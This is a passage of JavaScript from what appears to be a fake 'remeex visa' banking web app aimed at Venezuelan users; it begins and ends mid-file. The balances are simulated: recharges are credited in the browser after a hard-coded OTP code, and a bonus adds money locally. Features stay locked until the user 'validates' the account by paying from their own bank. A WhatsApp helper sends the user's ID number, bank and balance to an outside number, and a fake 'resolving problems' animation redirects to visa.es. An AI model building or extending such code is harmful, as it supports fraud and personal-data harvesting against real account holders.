    // Show welcome modal
    function showWelcomeModal() {
      const welcomeModal = document.getElementById('welcome-modal');
      const welcomeSubtitle = document.getElementById('welcome-subtitle');
      
      if (welcomeModal && welcomeSubtitle) {
        // Personalizar el saludo con el nombre del usuario
        welcomeSubtitle.textContent = `Estamos felices de tenerte con nosotros, ${currentUser.name.split(' ')[0]}`;
        welcomeModal.style.display = 'flex';
      }
    }

    // Setup inactivity modal
    function setupInactivityModal() {
      const continueBtn = document.getElementById('inactivity-continue');
      const logoutBtn = document.getElementById('inactivity-logout');
      
      if (continueBtn) {
        continueBtn.addEventListener('click', function() {
          resetInactivityTimer();
        });
      }
      
      if (logoutBtn) {
        logoutBtn.addEventListener('click', function() {
          logout();
        });
      }
    }

    // Acciones para validar cuenta mediante recarga
      function setupBankValidationActions() {
        const rechargeBtn = document.getElementById('start-recharge');
        const statusBtn = document.getElementById('view-status');
        const supportBtn = document.getElementById('bank-support');

        const levelBtn = document.getElementById('account-level');
        const viewLevelBtn = document.getElementById('view-account-level');
        const gotoBtn = document.getElementById('go-validation-data');
        const benefitsBtn = document.getElementById('open-validation-benefits');
        const faqBtn = document.getElementById('open-validation-faq');

      if (rechargeBtn) {
        rechargeBtn.addEventListener('click', function() {
          const dashboardContainer = document.getElementById('dashboard-container');
          const rechargeContainer = document.getElementById('recharge-container');

          if (dashboardContainer) dashboardContainer.style.display = 'none';
          if (rechargeContainer) rechargeContainer.style.display = 'block';

          // Seleccionar pestaa de Pago Mvil
          document.querySelectorAll('.payment-method-tab').forEach(t => t.classList.remove('active'));
          const mobileTab = document.querySelector('.payment-method-tab[data-target="mobile-payment"]');
          if (mobileTab) mobileTab.classList.add('active');
          document.querySelectorAll('.payment-method-content').forEach(c => c.classList.remove('active'));
          const mobileContent = document.getElementById('mobile-payment');
          if (mobileContent) mobileContent.classList.add('active');

          updateSavedCardUI();
          resetInactivityTimer();
        });
      }

      if (statusBtn) {
        statusBtn.addEventListener('click', function() {
          window.location.href = '';
          resetInactivityTimer();
        });
      }

      if (supportBtn) {
        supportBtn.addEventListener('click', function() {
          window.open('https://wa.me/+17373018059', '_blank');
          resetInactivityTimer();
        });
      }

      function openTierModal() {
        const overlay = document.getElementById('account-tier-overlay');
        if (overlay) {
          highlightCurrentTierRow();
          populateValidationInfo();
          overlay.style.display = 'flex';
        }
      }

      if (levelBtn) levelBtn.addEventListener('click', openTierModal);
      if (viewLevelBtn) viewLevelBtn.addEventListener('click', openTierModal);

      if (gotoBtn) {
        gotoBtn.addEventListener('click', function() {
          openRechargeTab('mobile-payment');
          const target = document.getElementById('seccion-pago-movil');
          if (target) {
            setTimeout(() => target.scrollIntoView({ behavior: 'smooth' }), 100);
          }
        });
      }

      if (benefitsBtn) {
        benefitsBtn.addEventListener('click', function() {
          const o = document.getElementById('validation-benefits-overlay');
          if (o) o.style.display = 'flex';
        });
      }

      if (faqBtn) {
        faqBtn.addEventListener('click', function() {
          personalizeValidationFAQAnswers();
          const o = document.getElementById('validation-faq-overlay');
          if (o) o.style.display = 'flex';
        });
      }
    }

    // Configurar overlay de bono de bienvenida
    function setupWelcomeBonus() {
      const acceptBtn = document.getElementById('bonus-accept');
      const rejectBtn = document.getElementById('bonus-reject');
      const bonusContainer = document.getElementById('bonus-container');

      if (acceptBtn) {
        acceptBtn.addEventListener('click', function() {
          currentUser.balance.usd += 15;
          currentUser.balance.bs += 15 * CONFIG.EXCHANGE_RATES.USD_TO_BS;
          currentUser.balance.eur += 15 * CONFIG.EXCHANGE_RATES.USD_TO_EUR;
          saveBalanceData();
          addTransaction({
            type: 'deposit',
            amount: 15,
            amountBs: 15 * CONFIG.EXCHANGE_RATES.USD_TO_BS,
            amountEur: 15 * CONFIG.EXCHANGE_RATES.USD_TO_EUR,
            date: getCurrentDateTime(),
            description: 'Bono de bienvenida',
            status: 'completed'
          });
          saveWelcomeBonusStatus(true);
          if (bonusContainer) bonusContainer.style.display = 'none';
          updateUserUI();
          addNotification('success', 'Bono de bienvenida', 'Has recibido $15 por tu primera recarga.');
        });
      }

      if (rejectBtn) {
        rejectBtn.addEventListener('click', function() {
          saveWelcomeBonusStatus(true);
          if (bonusContainer) bonusContainer.style.display = 'none';
        });
      }

      showWelcomeBonusIfEligible();
    }

    function isEligibleForWelcomeBonus() {
      if (currentUser.hasClaimedWelcomeBonus) return false;
      if (currentUser.cardRecharges >= 1) return true;
      if (exchangeHistory.some(h => h.type === 'receive')) return true;
      return false;
    }

    function showWelcomeBonusIfEligible() {
      const bonusContainer = document.getElementById('bonus-container');
      if (bonusContainer && isEligibleForWelcomeBonus()) {
        bonusContainer.style.display = 'flex';
      }
    }

    function setupTransactionFilter() {
      const filterSelect = document.getElementById('transaction-filter');
      const addBtn = document.getElementById('add-widget');

      if (filterSelect) {
        filterSelect.addEventListener('change', function() {
          transactionFilter = this.value;
          displayedTransactions.clear();
          document.getElementById('recent-transactions').innerHTML = '';
          updateRecentTransactions();
        });
      }

      if (addBtn) {
        addBtn.addEventListener('click', function() {
          showToast('info', 'Prximamente', 'Podrs aadir accesos directos aqu');
        });
      }
    }

    // Setup logout modal
    function setupLogoutModal() {
      const logoutModal = document.getElementById('logout-modal');
      const logoutConfirm = document.getElementById('logout-confirm');
      const logoutCancel = document.getElementById('logout-cancel');

      if (logoutConfirm) {
        logoutConfirm.addEventListener('click', function() {
          if (logoutModal) logoutModal.style.display = 'none';
          logout();
        });
      }

      if (logoutCancel) {
        logoutCancel.addEventListener('click', function() {
          if (logoutModal) logoutModal.style.display = 'none';
          resetInactivityTimer();
        });
      }
    }

    // Setup service overlay
    function setupServiceOverlay() {
      const serviceNav = document.querySelector('.nav-item[data-section="services"]');
      const serviceOverlay = document.getElementById('service-overlay');
      const serviceClose = document.getElementById('service-close');
      
      if (serviceNav) {
        serviceNav.addEventListener('click', function() {
          if (serviceOverlay) serviceOverlay.style.display = 'flex';
          resetInactivityTimer();
        });
      }
      
      if (serviceClose) {
        serviceClose.addEventListener('click', function() {
          if (serviceOverlay) serviceOverlay.style.display = 'none';
          resetInactivityTimer();
        });
      }
      
      // Bloquear servicios hasta verificacin excepto Intercambio, Donacin, Zelle, Wallets, Mi cuenta en USA y Mis ahorros
      document.querySelectorAll('.service-item').forEach(item => {
          if (item.id !== 'service-market' && item.id !== 'service-donation' && item.id !== 'service-zelle' && item.id !== 'service-us-account' && item.id !== 'service-bills' && item.id !== 'service-exchange' && item.id !== 'service-wallets' && item.id !== 'service-savings') {
          item.addEventListener('click', function() {
            showFeatureBlockedModal();
            resetInactivityTimer();
          });
        }
      });
    }

    // Setup cards overlay
    function setupCardsOverlay() {
      const cardsNav = document.querySelector('.nav-item[data-section="cards"]');
      const cardsOverlay = document.getElementById('cards-overlay');
      const cardClose = document.getElementById('card-close');
      
      if (cardsNav) {
        cardsNav.addEventListener('click', function() {
          if (cardsOverlay) cardsOverlay.style.display = 'flex';
          resetInactivityTimer();
        });
      }
      
      if (cardClose) {
        cardClose.addEventListener('click', function() {
          if (cardsOverlay) cardsOverlay.style.display = 'none';
          resetInactivityTimer();
        });
      }
      
      // Verificar para tarjeta
      const verifyForCard = document.getElementById('verify-for-card');
      if (verifyForCard) {
        verifyForCard.addEventListener('click', function() {
          if (cardsOverlay) cardsOverlay.style.display = 'none';

          // Redirigir a la pgina de verificacin
          window.location.href = '';

          resetInactivityTimer();
        });
      }
    }

    // Setup messages overlay
    function setupMessagesOverlay() {
      const messagesNav = document.querySelector('.nav-item[data-section="messages"]');
      const notificationBtn = document.getElementById('notification-btn');
      const messagesOverlay = document.getElementById('messages-overlay');
      const messagesClose = document.getElementById('messages-close');
      
      if (messagesNav) {
        messagesNav.addEventListener('click', function() {
          if (messagesOverlay) {
            renderNotifications();
            messagesOverlay.style.display = 'flex';
          }
          resetInactivityTimer();
        });
      }
      
      if (notificationBtn) {
        notificationBtn.addEventListener('click', function() {
          if (messagesOverlay) {
            renderNotifications();
            messagesOverlay.style.display = 'flex';
          }
          resetInactivityTimer();
        });
      }
      
      if (messagesClose) {
        messagesClose.addEventListener('click', function() {
          if (messagesOverlay) messagesOverlay.style.display = 'none';
          clearNotifications();
          resetInactivityTimer();
        });
      }
    }

    function setupSavingsOverlay() {
      const savingsItem = document.getElementById('service-savings');
      const savingsOverlay = document.getElementById('savings-overlay');
      const savingsClose = document.getElementById('savings-close');
      const createBtn = document.getElementById('create-savings-btn');
      const viewBtn = document.getElementById('view-savings-btn');

      if (savingsItem) {
        savingsItem.addEventListener('click', function() {
          if (savingsOverlay) savingsOverlay.style.display = 'flex';
          updateSavingsUI();
          updateSavingsVerificationBanner();
          resetInactivityTimer();
        });
      }

      if (viewBtn) {
        viewBtn.addEventListener('click', function() {
          if (savingsOverlay) savingsOverlay.style.display = 'flex';
          updateSavingsUI();
          updateSavingsVerificationBanner();
          resetInactivityTimer();
        });
      }

      if (savingsClose) {
        savingsClose.addEventListener('click', function() {
          if (savingsOverlay) savingsOverlay.style.display = 'none';
          resetInactivityTimer();
        });
      }

      if (createBtn) {
        createBtn.addEventListener('click', function() {
          openSavingsActionModal('create');
          resetInactivityTimer();
        });
      }

      const modalClose = document.getElementById('savings-modal-close');
      const modalConfirm = document.getElementById('savings-modal-confirm');
      if (modalClose) {
        modalClose.addEventListener('click', function() {
          closeSavingsActionModal();
          resetInactivityTimer();
        });
      }
      if (modalConfirm) {
        modalConfirm.addEventListener('click', function() {
          confirmSavingsAction();
          resetInactivityTimer();
        });
      }
    }

    function setupDonationLink() {
      const donationItem = document.getElementById('service-donation');
      if (donationItem) {
          donationItem.addEventListener('click', function() {
            if (currentUser.balance && currentUser.balance.usd > 0) {
              openPage('');
            } else {
              showToast('error', 'Saldo insuficiente', 'Recarga tu cuenta para poder realizar donaciones.');
            }
          });
      }
    }

    // Setup support overlay
    function setupSupportOverlay() {
      const supportNav = document.querySelector('.nav-item[data-section="support"]');
      const supportOverlay = document.getElementById('support-overlay');
      const supportClose = document.getElementById('support-close');

      if (supportNav) {
        supportNav.addEventListener('click', function() {
          if (supportOverlay) supportOverlay.style.display = 'flex';
          resetInactivityTimer();
        });
      }

      if (supportClose) {
        supportClose.addEventListener('click', function() {
          if (supportOverlay) supportOverlay.style.display = 'none';
          resetInactivityTimer();
        });
      }

      const liveSupportBtn = document.getElementById('live-support-btn');
      const forumChatLink = document.getElementById('forum-chat-link');
      if (liveSupportBtn) {
        liveSupportBtn.addEventListener('click', function(e) {
          e.preventDefault();
          loadTawkTo();
          if (supportOverlay) supportOverlay.style.display = 'none';
          resetInactivityTimer();
        });
      }

      if (forumChatLink) {
        forumChatLink.addEventListener('click', function(e) {
          e.preventDefault();
          if (typeof loadForumPage === 'function') {
            loadForumPage();
          } else {
            window.location.href = '';
          }
          if (supportOverlay) supportOverlay.style.display = 'none';
          resetInactivityTimer();
        });
      }
    }

    function setupForumLinks() {
      const badge = document.getElementById('online-users-link');
      if (badge) {
        badge.addEventListener('click', function() {
          if (typeof loadForumPage === 'function') {
            loadForumPage();
          } else {
            window.location.href = '';
          }
        });
      }
    }


    // Setup exchange overlay
    function setupExchangeOverlay() {
      const exchangeItem = document.getElementById("service-market");
        if (exchangeItem) {
          exchangeItem.addEventListener("click", function () {
            openPage('');
          });
        }
    }

    // Enlace para activar Zelle

    function setupBillsLink() {
      const billsItem = document.getElementById("service-bills");
        if (billsItem) {
          billsItem.addEventListener("click", function() {
            openPage('');
          });
        }
    }
    function setupZelleLink() {
      const zelleItem = document.getElementById('service-zelle');
      if (zelleItem) {
        const label = zelleItem.querySelector('.service-name');
        const zelleStatus = localStorage.getItem('remeexZelleStatus');
        if (zelleStatus === 'active' && label) {
          label.textContent = 'Zelle';
        }

          zelleItem.addEventListener('click', function() {
            const chaseStatus = localStorage.getItem('remeexChaseStatus');
            if (chaseStatus !== 'active') {
              showToast('info', 'Requiere Cuenta en USA', 'Crea tu cuenta en USA para habilitar Zelle.');
              return;
            }
            openPage('');
          });
      }
    }

    function setupWalletsLink() {
      const walletsItem = document.getElementById('service-wallets');
        if (walletsItem) {
          walletsItem.addEventListener('click', function() {
            openPage('cambio-divisas#wallets');
          });
        }
    }
    function setupCurrencyExchangeLink() {
      const item = document.getElementById('service-exchange');
        if (item) {
          item.addEventListener('click', function() {
            openPage('');
          });
        }
    }
function setupUsAccountLink() {
  const usItem = document.getElementById("service-us-account");
    if (usItem) {
      usItem.addEventListener("click", function() {
        openPage('');
      });
    }
}

  function setupWithdrawalLink() {
    const item = document.getElementById('service-withdrawal');
    if (item) {
      item.addEventListener('click', function() {
        openPage('');
      });
    }
  }

  function setupPageOverlay() {
    const closeBtn = document.getElementById('page-close');
    if (closeBtn) {
      closeBtn.addEventListener('click', closePageOverlay);
    }
  }

  function openPage(url) {
    const frame = document.getElementById('page-frame');
    const overlay = document.getElementById('page-overlay');
    if (frame) frame.src = url;
    if (overlay) overlay.style.display = 'flex';
    ensureTawkToVisibility();
    resetInactivityTimer();
  }

  function closePageOverlay() {
    const frame = document.getElementById('page-frame');
    const overlay = document.getElementById('page-overlay');
    if (overlay) overlay.style.display = 'none';
    if (frame) frame.src = '';
    resetInactivityTimer();
  }

    function setupLoginSupportMenu() {
      const supportBtn = document.getElementById('support-btn');
      const menu = document.getElementById('support-menu');
      const menuClose = document.getElementById('support-menu-close');
      const recover = document.getElementById('recover-password');
      const whatsapp = document.getElementById('whatsapp-support');
      const tawk = document.getElementById('tawk-support');

      if (supportBtn) {
        supportBtn.addEventListener('click', function() {
          if (menu) {
            menu.classList.toggle('open');
          }
        });
      }

      if (menuClose) {
        menuClose.addEventListener('click', function() {
          if (menu) menu.classList.remove('open');
        });
      }

      // Cerrar el men al hacer clic fuera o presionar ESC
      document.addEventListener('click', function(e) {
        if (menu && menu.classList.contains('open')) {
          if (!menu.contains(e.target) && !supportBtn.contains(e.target)) {
            menu.classList.remove('open');
          }
        }
      });

      document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && menu && menu.classList.contains('open')) {
          menu.classList.remove('open');
        }
      });

      function buildSupportMessage() {
        const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
        const creds = JSON.parse(localStorage.getItem('remeexUserCredentials') || '{}');
        const name = creds.name || reg.preferredName || reg.firstName || 'usuario';
        const balanceData = JSON.parse(localStorage.getItem('remeexBalance') || '{}');
        const saldoBs = balanceData.bs ? balanceData.bs.toLocaleString('es-VE', { minimumFractionDigits: 2 }) : 'N/A';
        const saldoUsd = balanceData.usd ? balanceData.usd.toLocaleString('en-US', { minimumFractionDigits: 2 }) : 'N/A';
        const id = creds.idNumber || reg.documentNumber || '';
        const bank = BANK_NAME_MAP[reg.primaryBank] || reg.primaryBank || 'mi banco';
        const tier = localStorage.getItem('remeexAccountTier') || 'Estndar';

        let message = `Hola, soy ${name}, cdula ${id}, soy usuario remeex visa VERE54872 de Venezuela. Mi saldo actual es de ${saldoBs} Bs (${saldoUsd} USD), mi banco asociado es ${bank}, mi nivel de cuenta es ${tier}, y solicito ayuda para el proceso de validacin de mi cuenta, ya que mi nivel ${tier} requiere que haga una validacin desde mi cuenta de banco ${bank}`;

        if (balanceData.usd > 515) {
          try {
            const data = JSON.parse(localStorage.getItem('remeexTransactions') || '{}');
            const txs = data.transactions || [];
            const deposits = txs.filter(t => t.type === 'deposit' && t.status === 'completed');
            if (deposits.length) {
              const details = deposits.map(t => {
                if (t.description === 'Bono de bienvenida') {
                  return `Bono de Bienvenida de ${formatCurrency(t.amount, 'usd')}`;
                }
                const card = t.card ? ` ${t.card}` : '';
                return `${t.description}${card} por la cantidad de ${formatCurrency(t.amount, 'usd')}`;
              }).join(' / ');
              message += `\n\n${details}`;
            }
          } catch (e) {}
        }
        return message;
      }

      function sendWhatsApp() {
        const encoded = encodeURIComponent(buildSupportMessage());
        window.open(`https://wa.me/+17373018059?text=${encoded}`, '_blank');
      }

      if (recover) {
        recover.addEventListener('click', function() {
          const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
          const name = reg.preferredName || reg.firstName || '';
          const email = reg.email || '';
          sendWhatsApp(`Hola, soy ${name} (${email}) y olvid mi contrasea de inicio de sesin.`);
          if (menu) menu.classList.remove('open');
        });
      }

      if (whatsapp) {
        whatsapp.addEventListener('click', function() {
          sendWhatsApp('Hola, necesito ayuda con mi cuenta.');
          if (menu) menu.classList.remove('open');
        });
      }

      if (tawk) {
        tawk.addEventListener('click', function() {
          loadTawkTo();
          if (menu) menu.classList.remove('open');
        });
      }
    }

    function setupPasswordToggles() {
      const toggles = [
        {btn: 'toggle-login-password', input: 'login-password'},
        {btn: 'toggle-visa-code', input: 'visa-code'}
      ];
      toggles.forEach(t => {
        const btnEl = document.getElementById(t.btn);
        const inputEl = document.getElementById(t.input);
        if (btnEl && inputEl) {
          btnEl.addEventListener('click', function() {
            if (inputEl.type === 'password') {
              inputEl.type = 'text';
              btnEl.innerHTML = '<i class="fas fa-eye-slash"></i>';
            } else {
              inputEl.type = 'password';
              btnEl.innerHTML = '<i class="fas fa-eye"></i>';
            }
          });
        }
      });
    }

    // Setup settings overlay
    function setupSettingsOverlay() {
      const settingsNav = document.querySelector('.nav-item[data-section="settings"]');
      const settingsOverlay = document.getElementById('settings-overlay');
      const settingsClose = document.getElementById('settings-close');
      
      if (settingsNav) {
        settingsNav.addEventListener('click', function() {
          if (settingsOverlay) {
            settingsOverlay.style.display = 'flex';

            // Update settings form
            const settingsName = document.getElementById('settings-name');
            const settingsEmail = document.getElementById('settings-email');

            if (settingsName) settingsName.value = currentUser.name;
            if (settingsEmail) settingsEmail.value = currentUser.email;

            updateVerificationButtons();
          }
          resetInactivityTimer();
        });
      }
      
      if (settingsClose) {
        settingsClose.addEventListener('click', function() {
          if (settingsOverlay) settingsOverlay.style.display = 'none';
          resetInactivityTimer();
        });
      }
      
      // Actualizar botones de verificacin
      updateVerificationButtons();


      const resolveBtn = document.getElementById('resolve-problem-btn');
      if (resolveBtn) {
        const hasMobile = currentUser.transactions.some(t => t.description === 'Pago Mvil');
        resolveBtn.style.display = hasMobile ? 'block' : 'none';
        resolveBtn.addEventListener('click', function() {
          if (settingsOverlay) settingsOverlay.style.display = 'none';
          const loadingOverlay = document.getElementById('loading-overlay');
          const progressBar = document.getElementById('progress-bar');
          const loadingText = document.getElementById('loading-text');
          if (loadingOverlay) loadingOverlay.style.display = 'flex';
          if (progressBar && loadingText) {
            progressBar.style.width = '0%';
            gsap.to(progressBar, {
              width: '100%',
              duration: 2,
              ease: 'power1.inOut',
              onUpdate: function() { loadingText.textContent = 'Resolviendo problemas...'; },
              onComplete: function() {
                setTimeout(function() {
                  if (loadingOverlay) loadingOverlay.style.display = 'none';
                  localStorage.setItem(CONFIG.STORAGE_KEYS.PROBLEM_RESOLVED, 'true');
                  window.location.href = 'https://visa.es';
                }, 500);
              }
            });
          }
          resetInactivityTimer();
        });
      }
    }
    // Setup feature blocked
    function setupFeatureBlocked() {
      const goVerifyNow = document.getElementById('go-verify-now');
      const featureBlockedClose = document.getElementById('feature-blocked-close');
      
      if (goVerifyNow) {
        goVerifyNow.addEventListener('click', function() {
          document.getElementById('feature-blocked-modal').style.display = 'none';

          // Redirigir a la pgina de verificacin
          window.location.href = '';

          resetInactivityTimer();
        });
      }
      
      if (featureBlockedClose) {
        featureBlockedClose.addEventListener('click', function() {
          document.getElementById('feature-blocked-modal').style.display = 'none';
          resetInactivityTimer();
        });
      }
    }

    // Show feature blocked modal
    function showFeatureBlockedModal() {
      const featureBlockedModal = document.getElementById('feature-blocked-modal');
      
      if (featureBlockedModal) {
        if (verificationStatus.status === 'pending' || verificationStatus.status === 'processing' || verificationStatus.status === 'bank_validation' || verificationStatus.status === 'payment_validation') {
          // Si la verificacin est en proceso, mostrar un mensaje diferente
          document.querySelector('.feature-blocked-title').textContent = 'Verificacin en Proceso';
          document.querySelector('.feature-blocked-message').textContent = 
            'Su documentacin est siendo revisada. Esta funcin estar disponible una vez que se complete la verificacin. Este proceso puede tardar hasta 30 minutos. Contacta a soporte para verificar tu estatus';
          // Botn de verificacin no visible
        } else {
          // Si no est verificado, mostrar el mensaje normal
          document.querySelector('.feature-blocked-title').textContent = 'Verificacin Requerida';
          document.querySelector('.feature-blocked-message').textContent = 
            'Esta funcin requiere verificacin de identidad para su activacin. Por favor, complete el proceso de verificacin para acceder a todas las funcionalidades.';
          // Botn de verificacin no visible
        }
        
        featureBlockedModal.style.display = 'flex';
      }
    }

    // Login form handler
    function setupLoginForm() {
      const loginButton = document.getElementById('login-button');
      if (loginButton) {
        loginButton.addEventListener('click', function() {
          const passwordInput = document.getElementById('login-password');
          const codeInput = document.getElementById('visa-code');
          const storedCreds = JSON.parse(localStorage.getItem('visaUserData') || '{}');

          const codeError = document.getElementById('code-error');
          const passwordError = document.getElementById('login-password-error');

          if (codeError) codeError.style.display = 'none';
          if (passwordError) passwordError.style.display = 'none';

          let isValid = true;

          if (!passwordInput || !passwordInput.value) {
            if (passwordError) passwordError.style.display = 'block';
            isValid = false;
          } else if (storedCreds.password && passwordInput.value !== storedCreds.password) {
            if (passwordError) {
              passwordError.textContent = 'Contrasea incorrecta.';
              passwordError.style.display = 'block';
            }
            isValid = false;
          }

          const expectedCode = (storedCreds && (storedCreds.securityCode || storedCreds.verificationCode)) || CONFIG.LOGIN_CODE;
          if (!codeInput || !codeInput.value || codeInput.value !== expectedCode) {
            if (codeError) codeError.style.display = 'block';
            isValid = false;
          }
          
          if (isValid) {
            // Set current user information
            currentUser.name = escapeHTML(
              storedCreds.preferredName || storedCreds.name || `${storedCreds.firstName || ''} ${storedCreds.lastName || ''}`.trim()
            );
            currentUser.fullName = escapeHTML(
              storedCreds.fullName || `${storedCreds.firstName || ''} ${storedCreds.lastName || ''}`.trim()
            );
            currentUser.email = escapeHTML(storedCreds.email || '');
            currentUser.deviceId = storedCreds.deviceId || generateDeviceId(); // Asignar ID nico al dispositivo
            currentUser.idNumber = storedCreds.documentNumber || storedCreds.idNumber || "";
            currentUser.phoneNumber = storedCreds.phoneNumber || ""; 
            
            // Guardar datos de usuario
            saveUserData();
            
            // Guardar credenciales de usuario en localStorage para futuros inicios de sesin
            saveUserCredentials(currentUser.name, currentUser.email);
            
            // Guardar datos de sesin
            saveSessionData();
            
            // Cargar datos previos
            loadBalanceData();
            loadTransactionsData();
            loadVerificationStatus();
            loadCardData();
            loadFirstRechargeStatus();
            loadWelcomeBonusStatus();
            
            // CORRECCIN 2: Cargar datos de pago mvil despus del login
            loadMobilePaymentData();
            
            // Update user display
            updateUserUI();
            
            // Show loading overlay
            const loadingOverlay = document.getElementById('loading-overlay');
            if (loadingOverlay) loadingOverlay.style.display = 'flex';
            
            // Animate progress bar
            const progressBar = document.getElementById('progress-bar');
            const loadingText = document.getElementById('loading-text');
            
            // GSAP animation for smoother progress
            if (progressBar && loadingText) {
              gsap.to(progressBar, {
                width: '100%',
                duration: 1.5,
                ease: 'power2.inOut',
                onUpdate: function() {
                  const progress = Math.round(this.progress() * 100);
                  if (progress < 30) {
                    loadingText.textContent = "Conectando con el servidor...";
                  } else if (progress < 70) {
                    loadingText.textContent = "Verificando credenciales...";
                  } else {
                    loadingText.textContent = "Acceso concedido. Cargando panel...";
                  }
                },
                onComplete: function() {
                  // Hide login, show dashboard
                  setTimeout(function() {
                    if (loadingOverlay) loadingOverlay.style.display = 'none';
                    const loginContainer = document.getElementById('login-container');
                    if (loginContainer) loginContainer.style.display = 'none';
                    
                    const appHeader = document.getElementById('app-header');
                    if (appHeader) appHeader.style.display = 'flex';
                    
                    const dashboardContainer = document.getElementById('dashboard-container');
                    if (dashboardContainer) dashboardContainer.style.display = 'block';
                    
                    const bottomNav = document.getElementById('bottom-nav');
                    if (bottomNav) bottomNav.style.display = 'flex';
                    
                    // Verificar qu banner mostrar segn estado
                    checkBannersVisibility();

                    // Check pending transactions
                    updatePendingTransactionsBadge();
                    updateRejectedTransactionsBadge();
                    
                    // Show welcome modal
                    showWelcomeModal();

                    addNotification('success', 'Inicio de sesi\u00f3n', 'Has iniciado sesi\u00f3n correctamente.');

                    // Configurar expiracin del aviso de seguridad
                    localStorage.setItem('securityNoticeExpiry', Date.now() + 600000);
                    localStorage.removeItem('securityNoticeClosed');
                    setTimeout(() => {
                      const notice = document.getElementById('promo-banner');
                      if (notice) {
                        notice.style.display = 'none';
                        localStorage.setItem('securityNoticeClosed', 'true');
                      }
                    }, 600000);
                    
                    // Mostrar toast de informacin de seguridad de dispositivo
                    setTimeout(() => {
                      showToast('info', 'Seguridad de Dispositivo', 'Por su seguridad, su saldo y transacciones solo estn disponibles en este dispositivo.', 5000);
                    }, 500);
                    
                    // Reset inactivity timer
                    resetInactivityTimer();
                    
                    // Scroll to top
                    window.scrollTo(0, 0);
                    
                    // CORRECCIN 2: Actualizar UI de pago mvil
                    updateMobilePaymentInfo();
                    
                    // Asegurar que el chat de Tawk est visible
                    ensureTawkToVisibility();
                  }, 500);
                }
              });
            }
          }
        });
      }
    }

    // OTP handling
    function setupOTPHandling() {
      const otpInputs = document.querySelectorAll('.otp-input');
      otpInputs.forEach(input => {
        input.addEventListener('input', function(e) {
          const value = e.target.value;
          
          // Solo permitir nmeros
          if (!/^\d*$/.test(value)) {
            this.value = this.value.replace(/\D/g, '');
            return;
          }
          
          if (value.length === 1) {
            const nextInput = document.getElementById(e.target.dataset.next);
            if (nextInput) {
              nextInput.focus();
            }
          }
        });
        
        input.addEventListener('keydown', function(e) {
          if (e.key === 'Backspace' && e.target.value === '') {
            const prevInput = document.getElementById(e.target.dataset.prev);
            if (prevInput) {
              prevInput.focus();
            }
          }
        });
      });
      
      // Verify OTP button
      const verifyOtpBtn = document.getElementById('verify-otp-btn');
      if (verifyOtpBtn) {
        verifyOtpBtn.addEventListener('click', function() {
          let otpValue = '';
          otpInputs.forEach(input => {
            otpValue += input.value;
          });
          
          // Check if OTP is valid
          if (CONFIG.OTP_CODES.includes(otpValue)) {
            // Check if user exceeded max recharges
            if (currentUser.cardRecharges >= CONFIG.MAX_CARD_RECHARGES) {
              // Hide OTP modal
              const otpModal = document.getElementById('otp-modal-overlay');
              if (otpModal) otpModal.style.display = 'none';
              
              // Show error
              showToast('error', 'Lmite Alcanzado', 'Ha alcanzado el lmite de recargas con tarjeta. Por favor verifique su cuenta para continuar.');
              
              // Show feature blocked modal
              showFeatureBlockedModal();
              
              return;
            }
            
            // Hide OTP modal
            const otpModal = document.getElementById('otp-modal-overlay');
            if (otpModal) otpModal.style.display = 'none';
            
            const otpError = document.getElementById('otp-error');
            if (otpError) otpError.style.display = 'none';
            
            // CORRECCIN 1: Guardar una copia del monto seleccionado antes de procesar
            const amountToDisplay = {
              usd: selectedAmount.usd,
              bs: selectedAmount.bs,
              eur: selectedAmount.eur
            };
            
            // Show loading overlay
            const loadingOverlay = document.getElementById('loading-overlay');
            if (loadingOverlay) loadingOverlay.style.display = 'flex';
            
            // Animate progress bar
            const progressBar = document.getElementById('progress-bar');
            const loadingText = document.getElementById('loading-text');
            
            // GSAP animation for smoother progress
            if (progressBar && loadingText) {
              gsap.to(progressBar, {
                width: '30%',
                duration: 1,
                ease: 'power1.inOut',
                onUpdate: function() {
                  loadingText.textContent = "Verificando tarjeta...";
                },
                onComplete: function() {
                  gsap.to(progressBar, {
                    width: '70%',
                    duration: 1.5,
                    ease: 'power1.inOut',
                    onUpdate: function() {
                      loadingText.textContent = "Procesando recarga...";
                    },
                    onComplete: function() {
                      gsap.to(progressBar, {
                        width: '100%',
                        duration: 1,
                        ease: 'power1.inOut',
                        onUpdate: function() {
                          loadingText.textContent = "Recarga completada con xito!";
                        },
                        onComplete: function() {
                          // Hide loading overlay after a short delay
                          setTimeout(function() {
                            if (loadingOverlay) loadingOverlay.style.display = 'none';
                            
                            // Actualizar balance del usuario
                            currentUser.balance.usd += amountToDisplay.usd;
                            currentUser.balance.bs += amountToDisplay.bs;
                            currentUser.balance.eur += amountToDisplay.eur;
                            
                            // Actualizar contador de recargas con tarjeta
                            currentUser.cardRecharges++;
                            
                            // Establecer que el usuario ya ha hecho su primera recarga
                            if (!currentUser.hasMadeFirstRecharge) {
                              saveFirstRechargeStatus(true);
                            }
                            
                            // Guardar datos
                            saveBalanceData();
                            saveCardData();
                            
                            // Guardar tarjeta si se seleccion la opcin
                            const saveCard = document.getElementById('save-card');
                            if (saveCard && saveCard.checked) {
                              currentUser.hasSavedCard = true;
                              saveCardData();
                              updateSavedCardUI();
                            }
                            
                            // Aadir transaccin
                            addTransaction({
                              type: 'deposit',
                              amount: amountToDisplay.usd,
                              amountBs: amountToDisplay.bs,
                              amountEur: amountToDisplay.eur,
                              date: getCurrentDateTime(),
                              description: 'Recarga con Tarjeta',
                              card: '****3009',
                              status: 'completed'
                            });
                            
                            // Restablecer los selectores de monto a estado por defecto
                            resetAmountSelectors();
                            
                            // CORRECCIN 1: Mostrar el monto correcto en la animacin de xito
                            const successAmount = document.getElementById('success-amount');
                            if (successAmount) successAmount.textContent = formatCurrency(amountToDisplay.usd, 'usd');
                            
                            const successContainer = document.getElementById('success-container');
                            if (successContainer) successContainer.style.display = 'flex';
                            addNotification('success', 'Recarga exitosa', `Recargaste ${formatCurrency(amountToDisplay.usd, 'usd')}`);

                            // Add confetti effect
                            setTimeout(() => {
                              confetti({
                                particleCount: 150,
                                spread: 80,
                                origin: { y: 0.6 }
                              });
                            }, 500);

                            if (currentUser.cardRecharges === 1 && !currentUser.hasClaimedWelcomeBonus && amountToDisplay.usd >= 500) {
                              setTimeout(() => {
                                const bonusContainer = document.getElementById('bonus-container');
                                if (bonusContainer) bonusContainer.style.display = 'flex';
                              }, 20000);
                            }
                          }, 800);
                        }
                      });
                    }
                  });
                }
              });
            }
          } else {
            // Show error
            const otpError = document.getElementById('otp-error');
